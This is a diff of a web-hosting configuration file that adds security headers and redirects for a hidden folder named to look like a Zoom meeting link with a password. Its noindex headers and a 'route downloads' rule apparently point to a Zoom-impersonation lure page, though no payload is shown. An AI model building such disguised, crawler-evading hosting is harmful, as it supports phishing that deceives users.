@@ -3,6 +3,11 @@
   [headers.values]
     X-Frame-Options = "DENY"
     Content-Security-Policy = "frame-ancestors 'none'; default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://us05st1.zoom.us; img-src 'self' data:; media-src 'self' blob:; connect-src 'self'"
+    X-Content-Type-Options = "nosniff"
+    Referrer-Policy = "strict-origin-when-cross-origin"
+    Permissions-Policy = "camera=(self), microphone=(self), geolocation=()"
+    X-Robots-Tag = "noindex, noarchive, nosnippet, nofollow"
+    Cache-Control = "private, max-age=0, must-revalidate"
 
 # 1. Route downloads through your guard
 [[redirects]]
@@ -22,5 +27,12 @@
 [[redirects]]
   from = "/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3"
   to = "/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/index.html"
+  status = 200
+  force = true
+
+# 4. Allow all files inside the secret folder to load properly
+[[redirects]]
+  from = "/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/*"
+  to = "/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/:splat"
   status = 200
   force = true
